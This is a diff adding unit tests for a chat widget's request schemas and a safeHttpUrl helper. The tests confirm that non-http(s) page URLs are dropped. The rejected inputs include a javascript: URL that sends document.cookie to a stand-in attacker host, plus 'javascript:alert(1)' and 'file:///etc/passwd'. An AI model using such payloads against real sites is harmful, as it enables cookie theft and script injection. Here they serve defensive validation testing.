@@ -1,4 +1,4 @@
-import { DEFAULT_WIDGET_THEME } from '@parbot/shared';
+import { DEFAULT_WIDGET_THEME, safeHttpUrl } from '@parbot/shared';
 import { describe, expect, it } from 'vitest';
 import { z } from 'zod';
 
@@ -19,7 +19,9 @@ import {
   parseWidgetSettings,
   requestOrigin,
   retryAfter,
+  widgetChatSchema,
   widgetConfigFor,
+  widgetLeadSchema,
   widgetSettingsOf,
   type WidgetSettings,
 } from './widget-api';
@@ -211,6 +213,76 @@ describe('jsonError and configCacheControl', () => {
     expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1&v='))).toBe(
       'no-store',
     );
+  });
+});
+
+describe('widget request bodies', () => {
+  const chat = {
+    key: PUBLIC_KEY,
+    visitorId: 'v_0123456789abcdef0123456789abcdef',
+    conversationId: '22222222-2222-4222-8222-222222222222',
+    message: 'Hi',
+  };
+  const lead = { key: chat.key, visitorId: chat.visitorId, email: 'ada@example.com' };
+
+  it('keeps an http(s) page url, trimmed', () => {
+    expect(
+      widgetChatSchema.parse({ ...chat, pageUrl: ' https://docs.example.com/a?b=1 ' }).pageUrl,
+    ).toBe('https://docs.example.com/a?b=1');
+    expect(widgetLeadSchema.parse({ ...lead, pageUrl: 'http://localhost:3000/x' }).pageUrl).toBe(
+      'http://localhost:3000/x',
+    );
+    expect(widgetChatSchema.parse(chat).pageUrl).toBeUndefined();
+  });
+
+  it('drops any other page url without refusing the request', () => {
+    for (const pageUrl of [
+      'javascript:alert(1)',
+      "javascript:fetch('//attacker.example/'+document.cookie)",
+      'data:text/html,hi',
+      'file:///etc/passwd',
+      '/relative',
+      'docs.example.com',
+      '',
+      `https://docs.example.com/${'x'.repeat(2048)}`,
+    ]) {
+      const chatResult = widgetChatSchema.safeParse({ ...chat, pageUrl });
+      const leadResult = widgetLeadSchema.safeParse({ ...lead, pageUrl });
+
+      expect(chatResult.success, pageUrl).toBe(true);
+      expect(chatResult.data?.pageUrl, pageUrl).toBeUndefined();
+      expect(leadResult.success, pageUrl).toBe(true);
+      expect(leadResult.data?.pageUrl, pageUrl).toBeUndefined();
+    }
+
+    expect(widgetChatSchema.safeParse({ ...chat, pageUrl: 42 }).success).toBe(false);
+  });
+});
+
+describe('safeHttpUrl', () => {
+  it('passes http and https addresses through and refuses every other scheme', () => {
+    expect(safeHttpUrl('https://docs.example.com/a?b=1#c')).toBe(
+      'https://docs.example.com/a?b=1#c',
+    );
+    expect(safeHttpUrl('  http://localhost:3000  ')).toBe('http://localhost:3000');
+    expect(safeHttpUrl('HTTPS://Docs.Example.com')).toBe('HTTPS://Docs.Example.com');
+
+    for (const value of [
+      'javascript:alert(1)',
+      'JavaScript:alert(1)',
+      'data:text/html,hi',
+      'mailto:a@b.co',
+      'ftp://x.io',
+      '/relative',
+      'https://',
+      'not a url',
+      '',
+      null,
+      undefined,
+      42,
+    ]) {
+      expect(safeHttpUrl(value), String(value)).toBeNull();
+    }
   });
 });
 
